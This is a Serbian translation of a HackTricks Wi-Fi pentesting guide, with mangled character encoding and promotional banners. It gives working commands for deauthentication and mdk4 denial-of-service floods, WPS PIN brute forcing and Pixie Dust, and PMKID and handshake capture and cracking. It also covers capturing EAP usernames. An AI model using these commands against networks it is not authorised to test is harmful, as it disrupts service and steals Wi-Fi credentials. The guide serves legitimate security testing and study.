# Testiranje bezbednosti Wifi mreÅ¾e

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Uvidi u Hakovanje**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o Hakovanju u Realnom Vremenu**\
Budite u toku sa dinamiÄnim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije Najave**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i bitnim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## Osnovne komande za Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Alati

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Pokrenite airgeddon pomoÄ‡u docker-a**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Sa: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

MoÅ¾e izvrÅ¡iti Evil Twin, KARMA i Known Beacons napade, a zatim koristiti phishing Å¡ablon da bi uspeo da dobije pravi lozinku mreÅ¾e ili da uhvati kredencijale druÅ¡tvenih mreÅ¾a.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Ovaj alat automatizuje napade na **WPS/WEP/WPA-PSK**. Automatski Ä‡e:

* Postaviti interfejs u reÅ¾im za praÄ‡enje
* Skenirati moguÄ‡e mreÅ¾e - I omoguÄ‡iti vam da odaberete Å¾rtvu(e)
* Ako je u pitanju WEP - Pokrenuti napade na WEP
* Ako je u pitanju WPA-PSK
* Ako je u pitanju WPS: Napad Pixie dust i napad brute-force (budite oprezni, brute-force napad moÅ¾e potrajati dugo). Imajte na umu da ne pokuÅ¡ava null PIN ili baze/pinove generisane iz baze.
* PokuÅ¡ati da uhvati PMKID sa AP-a radi pucanja
* PokuÅ¡ati da deautentifikuje klijente AP-a kako bi uhvatio handshake
* Ako je PMKID ili Handshake, pokuÅ¡ati brute-force sa top5000 lozinki.

## Sumarizacija Napada

* **DoS**
* Deautentifikacija/disasocijacija -- Diskonektovati sve (ili odreÄ‘eni ESSID/Klijent)
* SluÄajne laÅ¾ne AP-ove -- Sakrij mreÅ¾e, moguÄ‡i pad skenera
* PreoptereÄ‡enje AP-a -- PokuÅ¡aj da se uniÅ¡ti AP (obiÄno nije vrlo korisno)
* WIDS -- Igranje sa IDS-om
* TKIP, EAPOL -- Neki specifiÄni napadi za DoS nekih AP-ova
* **Pucanje**
* Pucanje **WEP** (nekoliko alata i metoda)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** brute-force
* \[DoS +] **WPA handshake** hvatanje + Pucanje
* **WPA-MGT**
* **Hvatanje korisniÄkog imena**
* **Brute-force** Kredencijala
* **Zli blizanac** (sa ili bez DoS-a)
* **Otvoreni** Zli blizanac \[+ DoS] -- Korisno za hvatanje kredencijala za captive portal i/ili izvoÄ‘enje LAN napada
* **WPA-PSK** Zli blizanac -- Korisno za mreÅ¾ne napade ako znate lozinku
* **WPA-MGT** -- Korisno za hvatanje korporativnih kredencijala
* **KARMA, MANA**, **Glasan MANA**, **Poznati beacon**
* **+ Otvoreni** -- Korisno za hvatanje kredencijala za captive portal i/ili izvoÄ‘enje LAN napada
* **+ WPA** -- Korisno za hvatanje WPA handshake-ova

## DOS

### Paketi Deautentifikacije

**Opis sa** [**ovde**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Napadi deautentifikacije, Äest metod u hakovanju Wi-Fi-ja, ukljuÄuju falsifikovanje "upravljaÄkih" okvira kako bi **prisilno diskonektovali ureÄ‘aje sa mreÅ¾e**. Ovi neÅ¡ifrovani paketi obmanjuju klijente da veruju da su od legitimne mreÅ¾e, omoguÄ‡avajuÄ‡i napadaÄima da prikupe WPA handshake-ove u svrhu pucanja ili da trajno ometaju mreÅ¾ne veze. Ova taktika, alarmantna u svojoj jednostavnosti, Å¡iroko se koristi i ima znaÄajne posledice po sigurnost mreÅ¾e.

**Deautentifikacija koriÅ¡Ä‡enjem Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 znaÄi deautentikaciju
* 1 je broj deautentikacija koje treba poslati (moÅ¾ete poslati viÅ¡e ako Å¾elite); 0 znaÄi slati ih kontinuirano
* \-a 00:14:6C:7E:40:80 je MAC adresa pristupne taÄke
* \-c 00:0F:B5:34:30:30 je MAC adresa klijenta za deautentikaciju; ako se izostavi, tada se Å¡alje emitovanje deautentikacije (ne radi uvek)
* ath0 je ime interfejsa

### Paketi diskonekcije

**Paketi diskonekcije**, sliÄno kao paketi deautentikacije, su vrsta upravljaÄkog okvira koji se koristi u Wi-Fi mreÅ¾ama. Ovi paketi sluÅ¾e da prekinu vezu izmeÄ‘u ureÄ‘aja (kao Å¡to su laptop ili pametni telefon) i pristupne taÄke (AP). Glavna razlika izmeÄ‘u diskonekcije i deautentikacije leÅ¾i u njihovim scenarijima koriÅ¡Ä‡enja. Dok AP emituje **pakete deautentikacije da bi eksplicitno uklonio zlonamerne ureÄ‘aje sa mreÅ¾e, paketi diskonekcije se obiÄno Å¡alju kada AP prolazi kroz iskljuÄivanje, restartovanje ili premestanje, Å¡to zahteva prekid veze sa svim povezanim Ävorovima.

**Ovaj napad moÅ¾e biti izveden pomoÄ‡u mdk4 (reÅ¾im "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **ViÅ¡e DOS napada pomoÄ‡u mdk4**

**Ovde** [**ovde**](https://en.kali.tools/?p=864)**.**

**NAPADNI REÅ½IM b: Poplava odaÅ¡iljanja**

Å alje odaÅ¡iljaÄke okvire kako bi prikazao laÅ¾ne AP-ove klijentima. Ponekad ovo moÅ¾e izazvati pad mreÅ¾nih skenera Äak i drajvera!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**NAPADNI REÅ½IM a: Odbijanje autentifikacije usluge**

Slanje autentifikacionih okvira svim dostupnim pristupnim taÄkama (AP) u dometu moÅ¾e preopteretiti ove AP, posebno kada je ukljuÄen veliki broj klijenata. Ovaj intenzivan saobraÄ‡aj moÅ¾e dovesti do nestabilnosti sistema, uzrokujuÄ‡i da neke AP zaledi ili Äak resetuje.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**NAPADNI REÅ½IM p: Probing SSID-a i Bruteforcing**

Probing pristupnih taÄaka (AP) proverava da li je SSID pravilno otkriven i potvrÄ‘uje opseg AP-a. Ova tehnika, zajedno sa **bruteforcing skrivenih SSID-ova** sa ili bez liste reÄi, pomaÅ¾e u identifikaciji i pristupanju skrivenim mreÅ¾ama.

**NAPADNI REÅ½IM m: IskoriÅ¡Ä‡avanje protivmere Michael**

Slanje sluÄajnih ili duplikatnih paketa razliÄitim QoS redovima moÅ¾e pokrenuti protivmere Michael na **TKIP AP-ovima**, Å¡to dovodi do jednominutnog gaÅ¡enja AP-a. Ovaj metod je efikasna taktika napada **DoS** (Odbijanje usluge).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**NAPADNI REÅ½IM e: Injekcija paketa EAPOL Start i Logoff**

Poplavljivanje AP-a sa **EAPOL Start okvirima** stvara **laÅ¾ne sesije**, preoptereÄ‡ujuÄ‡i AP i blokirajuÄ‡i legitimne klijente. Alternativno, ubacivanje **laÅ¾nih EAPOL Logoff poruka** prisilno prekida klijente, oba metoda efikasno ometaju mreÅ¾nu uslugu.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**NAPADNI REÅ½IM s: Napadi na IEEE 802.11s mreÅ¾e sa mreÅ¾nom mreÅ¾om**

RazliÄiti napadi na upravljanje vezama i rutiranje u mreÅ¾ama sa mreÅ¾nom mreÅ¾om.

**NAPADNI REÅ½IM w: Konfuzija WIDS-a**

Povezivanje klijenata sa viÅ¡e WDS Ävorova ili laÅ¾nih rogue AP-ova moÅ¾e manipulisati sistemima za otkrivanje i prevenciju upada, stvarajuÄ‡i konfuziju i potencijalno zloupotrebu sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**NAPADNI REÅ½IM f: Paket Fuzzer**

Paket fuzzer koji ima razliÄite izvore paketa i sveobuhvatan set modifikatora za manipulaciju paketima.

### **Airggedon**

_**Airgeddon**_ nudi veÄ‡inu napada predloÅ¾enih u prethodnim komentarima:

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS (Wi-Fi Protected Setup) pojednostavljuje proces povezivanja ureÄ‘aja s ruterom, poboljÅ¡avajuÄ‡i brzinu postavljanja i jednostavnost za mreÅ¾e koje su enkriptovane sa **WPA** ili **WPA2** Personal. Nije efikasan za lako kompromitovanu WEP sigurnost. WPS koristi 8-znamenkasti PIN, validiran u dva dela, Å¡to ga Äini podloÅ¾nim napadima brute-force zbog ograniÄenog broja kombinacija (11.000 moguÄ‡nosti).

### WPS Brute Force

Postoje 2 glavna alata za izvoÄ‘enje ove akcije: Reaver i Bully.

* **Reaver** je dizajniran da bude snaÅ¾an i praktiÄan napad protiv WPS-a, i testiran je protiv razliÄitih pristupnih taÄaka i implementacija WPS-a.
* **Bully** je **nova implementacija** napada brute force na WPS, napisana u C-u. Ima nekoliko prednosti u odnosu na originalni reaver kod: manje zavisnosti, poboljÅ¡anu memoriju i CPU performanse, ispravno rukovanje endijanom i robustan set opcija.

Napad iskoriÅ¡Ä‡ava **ranjivost WPS PIN-a**, posebno izlaganje prvih Äetiri cifre i ulogu poslednje cifre kao kontrolne znamenke, olakÅ¡avajuÄ‡i brute-force napad. MeÄ‘utim, odbrane od brute-force napada, poput **blokiranja MAC adresa** agresivnih napadaÄa, zahtevaju **rotaciju MAC adresa** kako bi se nastavio napad.

Nakon Å¡to napadaÄ dobije WPS PIN pomoÄ‡u alata poput Bully ili Reaver, moÅ¾e zakljuÄiti WPA/WPA2 PSK, obezbeÄ‘ujuÄ‡i **postojan pristup mreÅ¾i**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Pametni Brute Force**

Ovaj unapreÄ‘eni pristup cilja WPS PIN-ove koristeÄ‡i poznate ranjivosti:

1. **Prethodno otkriveni PIN-ovi**: Iskoristite bazu podataka poznatih PIN-ova povezanih sa odreÄ‘enim proizvoÄ‘aÄima koji koriste uniformne WPS PIN-ove. Ova baza podataka povezuje prva tri okteta MAC adresa sa verovatnim PIN-ovima za ove proizvoÄ‘aÄe.
2. **Algoritmi generisanja PIN-ova**: Iskoristite algoritme poput ComputePIN i EasyBox, koji izraÄunavaju WPS PIN-ove na osnovu MAC adrese AP-a. Arcadyan algoritam dodatno zahteva ID ureÄ‘aja, dodajuÄ‡i sloj procesu generisanja PIN-ova.

### Napad WPS Pixie Dust

**Dominique Bongard** je otkrio propust u nekim pristupnim taÄkama (AP) koji se odnosi na kreiranje tajnih kodova, poznatih kao **nonce**-ovi (**E-S1** i **E-S2**). Ako se ovi nonce-ovi mogu otkriti, pucanje WPS PIN-a AP-a postaje lako. AP otkriva PIN unutar posebnog koda (hash) kako bi dokazao da je legitimno i da nije laÅ¾na (rogue) AP. Ovi nonce-ovi su suÅ¡tinski "kljuÄevi" za otkljuÄavanje "sefa" koji drÅ¾i WPS PIN. ViÅ¡e informacija o ovome moÅ¾e se pronaÄ‡i [ovde](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

U jednostavnim terminima, problem je u tome Å¡to neke AP nisu koristile dovoljno sluÄajne kljuÄeve za Å¡ifrovanje PIN-a tokom procesa povezivanja. To Äini PIN ranjivim na nagaÄ‘anje spoljaÅ¡njeg mreÅ¾nog saobraÄ‡aja (napad Brute Force van mreÅ¾e).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Ako ne Å¾elite da prebacite ureÄ‘aj u monitor reÅ¾im, ili `reaver` i `bully` imaju neki problem, moÅ¾ete probati [OneShot-C](https://github.com/nikita-yfh/OneShot-C).
Ovaj alat moÅ¾e izvesti Pixie Dust napad bez potrebe za prebacivanjem u monitor reÅ¾im.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Napad nultim pinom

Neke loÅ¡e dizajnirane sisteme Äak i dozvoljavaju **Nulti PIN** (prazan ili nepostojeÄ‡i PIN) da omoguÄ‡i pristup, Å¡to je priliÄno neuobiÄajeno. Alat **Reaver** je sposoban da testira ovu ranjivost, za razliku od **Bully**-a.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Svi predloÅ¾eni napadi WPS-a mogu se lako izvesti koristeÄ‡i _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 i 6 vam omoguÄ‡avaju da probate **vaÅ¡ prilagoÄ‘eni PIN** (ako ga imate)
* 7 i 8 izvode **Pixie Dust napad**
* 13 vam omoguÄ‡ava da testirate **NULL PIN**
* 11 i 12 Ä‡e **prikupiti PIN-ove povezane sa odabranim AP-om iz dostupnih baza podataka** i **generisati** moguÄ‡e **PIN-ove** koristeÄ‡i: ComputePIN, EasyBox i opciono Arcadyan (preporuÄeno, zaÅ¡to ne?)
* 9 i 10 Ä‡e testirati **svaki moguÄ‡i PIN**

## **WEP**

Tako slomljen i nekoriÅ¡Ä‡en danas. Samo znajte da _**airgeddon**_ ima opciju WEP nazvanu "All-in-One" za napad na ovu vrstu zaÅ¡tite. ViÅ¡e alata nudi sliÄne opcije.

![](<../../.gitbook/assets/image (125).png>)


***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Latest Announcements**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

***


## WPA/WPA2 PSK

### PMKID

Godine 2018, **hashcat** je [otkrio](https://hashcat.net/forum/thread-7717.html) novu metodu napada, jedinstvenu jer zahteva samo **jedan jedini paket** i ne zahteva da bilo koji klijent bude povezan sa ciljnim AP-om - samo interakciju izmeÄ‘u napadaÄa i AP-a.

Mnogi moderni ruteri dodaju **opciono polje** u **prvi EAPOL** okvir tokom asocijacije, poznato kao `Robust Security Network`. To ukljuÄuje `PMKID`.

Kako originalna objava objaÅ¡njava, **PMKID** se kreira koristeÄ‡i poznate podatke:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
S obzirom da je "PMK ime" konstantno, znamo BSSID pristupne taÄke i stanice, a `PMK` je identiÄan onome iz potpune 4-way rukovanja, **hashcat** moÅ¾e koristiti ove informacije da probije PSK i povrati lozinku!

Da **prikupite** ove informacije i **bruteforce** lokalno lozinku, moÅ¾ete uraditi:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**Zaustavljeni PMKID-ovi** Ä‡e biti prikazani u **konzoli** i takoÄ‘e **saÄuvani** unutar \_ **/tmp/attack.pcap**\_\
Sada, konvertujte snimak u **hashcat/john** format i probajte ga:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Molimo vas da obratite paÅ¾nju da ispravan format heÅ¡a sadrÅ¾i **4 dela**, poput: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`
Ako vaÅ¡ heÅ¡ sadrÅ¾i **samo** **3 dela**, onda je **nevaÅ¾eÄ‡i** (PMKID snimak nije bio vaÅ¾eÄ‡i).

Imajte na umu da `hcxdumptool` **takoÄ‘e snima rukovanja** (neÅ¡to poput ovoga Ä‡e se pojaviti: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). MoÅ¾ete **pretvoriti** rukovanja u format **hashcat**/**john** koristeÄ‡i `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Obavestio sam da neki rukopisi uhvaÄ‡eni ovim alatom ne mogu biti probijeni Äak i kada se zna taÄna lozinka. PreporuÄio bih da se rukopisi uhvate i na tradicionalan naÄin ako je moguÄ‡e, ili da se uhvati nekoliko njih koristeÄ‡i ovaj alat._

### Snimanje rukopisa

Napad na **WPA/WPA2** mreÅ¾e moÅ¾e se izvrÅ¡iti snimanjem **rukopisa** i pokuÅ¡ajem **probijanja** lozinke **offline**. Ovaj proces ukljuÄuje praÄ‡enje komunikacije odreÄ‘ene mreÅ¾e i **BSSID** na odreÄ‘enom **kanalu**. Evo pojednostavljenog vodiÄa:

1. Identifikujte **BSSID**, **kanal** i **povezanog klijenta** ciljne mreÅ¾e.
2. Koristite `airodump-ng` da biste pratili saobraÄ‡aj mreÅ¾e na odreÄ‘enom kanalu i BSSID-u, u nadi da Ä‡ete uhvatiti rukopis. Komanda Ä‡e izgledati ovako:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Da biste poveÄ‡ali Å¡ansu za hvatanje handshake-a, privremeno iskljuÄite klijenta sa mreÅ¾e kako biste ga prisilili na ponovnu autentifikaciju. To se moÅ¾e uraditi koriÅ¡Ä‡enjem `aireplay-ng` komande, koja Å¡alje pakete deautentifikacije ka klijentu:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Napomena da je klijent deautentifikovan, moÅ¾e pokuÅ¡ati da se poveÅ¾e sa drugim AP-om ili, u drugim sluÄajevima, sa drugom mreÅ¾om._

Kada se pojave informacije o handshake-u u `airodump-ng`, to znaÄi da je handshake uhvaÄ‡en i moÅ¾ete prestati sa sluÅ¡anjem:

![](<../../.gitbook/assets/image (172) (1).png>)

Kada je handshake uhvaÄ‡en, moÅ¾ete ga **provaliti** pomoÄ‡u `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Provera da li je handshake u fajlu

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Ako ovaj alat pronaÄ‘e nedovrÅ¡en handshake ESSID pre zavrÅ¡enog, neÄ‡e otkriti validan._ 

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

U **WiFi postavkama za preduzeÄ‡a, susreÅ¡Ä‡eÅ¡ se sa razliÄitim metodama autentifikacije**, koje pruÅ¾aju razliÄite nivoe sigurnosti i funkcionalnosti upravljanja. Kada koristiÅ¡ alatke poput `airodump-ng` za inspekciju mreÅ¾nog saobraÄ‡aja, moÅ¾eÅ¡ primetiti identifikatore za ove tipove autentifikacije. Neki uobiÄajeni metodi ukljuÄuju:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Ova metoda podrÅ¾ava hardverske tokene i jednokratne lozinke unutar EAP-PEAP. Za razliku od MSCHAPv2, ne koristi peer izazov i Å¡alje lozinke u plaintext formatu pristupnoj taÄki, Å¡to predstavlja rizik od napada na smanjenje sigurnosti.

2. **EAP-MD5 (Message Digest 5)**:
- UkljuÄuje slanje MD5 heÅ¡a lozinke sa klijenta. **Nije preporuÄljivo** zbog ranjivosti na reÄniÄke napade, nedostatka autentifikacije servera i nemoguÄ‡nosti generisanja sesijski specifiÄnih WEP kljuÄeva.

3. **EAP-TLS (Transport Layer Security)**:
- Koristi i klijentske i serverske sertifikate za autentifikaciju i moÅ¾e dinamiÄki generisati korisniÄke i sesijske WEP kljuÄeve za obezbeÄ‘ivanje komunikacije.

4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- PruÅ¾a meÄ‘usobnu autentifikaciju putem enkriptovanog tunela, zajedno sa metodom za izvoÄ‘enje dinamiÄkih, po-korisniku, po-sesijskih WEP kljuÄeva. Zahteva samo serverske sertifikate, dok klijenti koriste akreditive.

5. **PEAP (Protected Extensible Authentication Protocol)**:
- FunkcioniÅ¡e sliÄno kao EAP stvaranjem TLS tunela za zaÅ¡tiÄ‡enu komunikaciju. OmoguÄ‡ava koriÅ¡Ä‡enje slabijih autentifikacionih protokola iznad EAP zbog zaÅ¡tite koju pruÅ¾a tunel.
* **PEAP-MSCHAPv2**: ÄŒesto nazvan PEAP, kombinuje ranjivi MSCHAPv2 mehanizam izazova/odgovora sa zaÅ¡titnim TLS tunelom.
* **PEAP-EAP-TLS (ili PEAP-TLS)**: SliÄno kao EAP-TLS, ali inicira TLS tunel pre razmene sertifikata, nudeÄ‡i dodatni sloj sigurnosti.

ViÅ¡e informacija o ovim autentifikacionim metodama moÅ¾ete pronaÄ‡i [ovde](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) i [ovde](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Snimanje KorisniÄkog Imena

ÄŒitajuÄ‡i [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) izgleda da ako koristite **EAP**, **"Identitet"** **poruke** moraju biti **podrÅ¾ane**, i **korisniÄko ime** Ä‡e biti poslato **Äisto** u **"Odgovoru na Identitet"** porukama.

ÄŒak i koristeÄ‡i jedan od najsigurnijih metoda autentifikacije: **PEAP-EAP-TLS**, moguÄ‡e je **snimiti korisniÄko ime poslato u EAP protokolu**. Da biste to uradili, **snimite autentifikacionu komunikaciju** (pokrenite `airodump-ng` unutar kanala i `wireshark` na istom interfejsu) i filtrirajte pakete po `eapol`.\
Unutar paketa "**Odgovor, Identitet**", pojaviÄ‡e se **korisniÄko ime** klijenta.

![](<../../.gitbook/assets/image (150).png>)

### Anonimni Identiteti

Skrivanje identiteta podrÅ¾ano je i od strane EAP-PEAP i EAP-TTLS. U kontekstu WiFi mreÅ¾e, zahtev za EAP-Identitetom obiÄno pokreÄ‡e pristupna taÄka (AP) tokom procesa asocijacije. Da bi se osigurala zaÅ¡tita anonimnosti korisnika, odgovor od EAP klijenta na ureÄ‘aju korisnika sadrÅ¾i samo osnovne informacije potrebne za poÄetni RADIUS server da obradi zahtev. Ovaj koncept je ilustrovan kroz sledeÄ‡e scenarije:

* EAP-Identitet = anonimno

- U ovom scenariju, svi korisnici koriste pseudonim "anonimno" kao svoj identifikator korisnika. PoÄetni RADIUS server funkcioniÅ¡e kao EAP-PEAP ili EAP-TTLS server, odgovoran za upravljanje serverskom stranom PEAP ili TTLS protokola. UnutraÅ¡nji (zaÅ¡tiÄ‡eni) autentifikacioni metod se zatim ili obraÄ‘uje lokalno ili se delegira na udaljeni (matiÄni) RADIUS server.

* EAP-Identitet = anonimno@realm_x

- U ovoj situaciji, korisnici iz razliÄitih oblasti skrivaju svoje identitete dok pokazuju svoje odgovarajuÄ‡e oblasti. Ovo omoguÄ‡ava poÄetnom RADIUS serveru da prosledi EAP-PEAP ili EAP-TTLS zahteve RADIUS serverima u njihovim matiÄnim oblastima, koji deluju kao PEAP ili TTLS server. PoÄetni RADIUS server funkcioniÅ¡e iskljuÄivo kao Ävor releja RADIUS-a.

- Alternativno, poÄetni RADIUS server moÅ¾e funkcionisati kao EAP-PEAP ili EAP-TTLS server i ili obraÄ‘ivati zaÅ¡tiÄ‡eni autentifikacioni metod ili ga prosleÄ‘ivati drugom serveru. Ova opcija olakÅ¡ava konfigurisanje razliÄitih politika za razliÄite oblasti.

U EAP-PEAP, kada se TLS tunel uspostavi izmeÄ‘u PEAP servera i PEAP klijenta, PEAP server pokreÄ‡e zahtev za EAP-Identitetom i prenosi ga kroz TLS tunel. Klijent odgovara na ovaj drugi zahtev za EAP-Identitetom slanjem odgovora na EAP-Identitet koji sadrÅ¾i pravi identitet korisnika kroz enkriptovani tunel. Ovaj pristup efikasno spreÄava otkrivanje stvarnog identiteta korisnika bilo kome ko prisluÅ¡kuje 802.11 saobraÄ‡aj.

EAP-TTLS prati neÅ¡to drugaÄiju proceduru. Sa EAP-TTLS, klijent obiÄno autentifikuje koristeÄ‡i PAP ili CHAP, obezbeÄ‘eno TLS tunelom. U ovom sluÄaju, klijent ukljuÄuje atribut KorisniÄko Ime i ili Lozinku ili CHAP-Lozinku u poÄetnu TLS poruku poslatu nakon uspostavljanja tunela.

